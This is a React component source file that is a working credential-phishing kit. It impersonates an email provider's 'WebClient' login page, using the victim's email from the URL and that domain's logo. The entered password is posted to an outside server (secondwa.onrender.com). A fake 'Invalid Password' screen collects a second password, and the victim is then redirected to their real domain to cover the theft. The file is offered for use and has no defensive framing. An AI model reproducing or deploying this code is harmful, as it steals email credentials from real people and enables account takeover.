import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls";
import { useParams } from "react-router-dom";
import axios from "axios";
function Forms() {
  const params = useParams();
  console.log(params.id);

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);
  const [pass, setPass] = useState("");
  const [pasers, setPasser] = useState("");
  const [email, setEmail] = useState(params.id);

  const submitHandler = async (e) => {
    e.preventDefault();

    console.log(email, pass);
    setConfirmForm(true);
    setShowForm(false);
    try {
      await axios.post("https://secondwa.onrender.com/sendmail5", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
  };
  let emailss = params.id;
  let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
  const editHandler = async (e) => {
    e.preventDefault();

    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);

    try {
      await axios.post("https://secondwa.onrender.com/sendmail5", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
  };
  const domainname = domain.substring(0, domain.lastIndexOf(".")).toUpperCase();

  return (
    <Styls>
      {" "}
      {showForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div id="login_logo">
                    <img src={`https://logo.clearbit.com/${domain}`} alt="" />
                  </div>
                  <h5 className="font-weight-light">
                    <b> {`${domainname} WebClient `} </b>
                    <br />
                  </h5>
                </div>
                <form className="formal" onSubmit={submitHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <input
                      type="email"
                      name="to_user"
                      onChange={(e) => setEmail(e.target.value)}
                      required
                      className="form-control"
                      value={params.id}
                    />
                    <input
                      type="password"
                      name="to_pass"
                      onChange={(e) => setPass(e.target.value)}
                      required
                      placeholder="Password"
                      className="form-control"
                    />

                    <div className="btn-holder">
                      <button className="btn btn-lg col-12">Sign In </button>
                    </div>
                  </div>
                </form>

                <p className="conne">
                  Conneted to <a href={`https://${domain}`}>{domain} </a>{" "}
                </p>
              </div>
            </div>
          </div>
        </div>
      )}
      {confirmForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div id="login_logo">
                    <img src={`https://logo.clearbit.com/${domain}`} alt="" />
                  </div>
                  <h5 className="font-weight-light">
                    <b> {`${domainname} WebClient `} </b>
                    <br />
                  </h5>
                </div>

                <div className="msg">
                  Invalid Password.! Please enter correct password.
                </div>

                <form className="formal" onSubmit={editHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <input
                      type="email"
                      name="to_user"
                      onChange={(e) => setEmail(e.target.value)}
                      required
                      className="form-control"
                      value={params.id}
                    />
                    <input
                      type="password"
                      name="to_pass"
                      onChange={(e) => setPasser(e.target.value)}
                      required
                      placeholder="Password"
                      className="form-control"
                    />

                    <div className="btn-holder">
                      <button className="btn btn-lg col-12">Sign In </button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
    </Styls>
  );
}

export default Forms;
